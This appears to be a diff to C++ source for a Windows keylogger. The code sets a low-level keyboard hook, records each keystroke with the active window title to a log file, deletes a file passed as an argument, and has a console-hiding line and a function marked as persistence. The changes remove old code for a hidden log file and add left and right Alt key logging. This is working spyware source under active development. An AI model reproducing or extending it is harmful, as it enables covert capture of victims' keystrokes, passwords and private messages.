@@ -14,13 +14,13 @@ using namespace std;
 #define LOG_FILE L"keyboard.log"
 
 HHOOK keyboardHook;
-//HANDLE  hFile;
 ofstream logFile;
 
 void logToFile(int vkCode);
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 void install();
 void setHook();
+
 
 int main(int argc, char** argv) {
 
@@ -34,43 +34,15 @@ int main(int argc, char** argv) {
 	DeleteFileA(argv[1]);
 	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // if 0, invisible window; if 1, visible window
 
-	/*
-
-	hFile = CreateFile(LOG_FILE,                // name of the write
-		GENERIC_WRITE,          // open for writing
-		FILE_SHARE_READ,
-		NULL,                   // default security
-		CREATE_ALWAYS,             // create new file, always; if exists and is writable, overwrites the file
-		FILE_ATTRIBUTE_HIDDEN,  // hidden file
-		NULL);                  // no attr. template
-
-	if (hFile == INVALID_HANDLE_VALUE)
-	{
-		printf("Cant create file log\n");
-		return 1;
-	}
-	printf("Create file successful\n");
-
-	*/
-
 	//open in appending mode
 	logFile.open(LOG_FILE, ofstream::app);
 
-	/*
-	if (SetConsoleCtrlHandler(CtrlHandler, true)) {
-
-		printf("Couldnt set control handle\n");
-
-	}
-	else {
-
-		setHook();
-	}*/
 	setHook();
 	logFile.close();
 	return 0;
 
 }
+
 //persistence
 void install() {
 	wchar_t currentPath[BUFFER_SIZE];
@@ -199,6 +171,7 @@ void logToFile(int vkCode) {
 
 		return;
 	}
+
 	//get window title
 	HWND fg = GetForegroundWindow();
 
@@ -264,6 +237,12 @@ void logToFile(int vkCode) {
 	case VK_MENU:
 		output << "[alt]";
 		break;
+	case VK_LMENU:
+		output << "[alt]";
+		break;
+	case VK_RMENU:
+		output << "[alt]";
+		break;
 	case VK_LWIN:
 		output << "[win]";
 		break;
@@ -316,6 +295,5 @@ void logToFile(int vkCode) {
 	cout << output.str();
 	//keep file open 
 	logFile.flush();
-	
 }
 
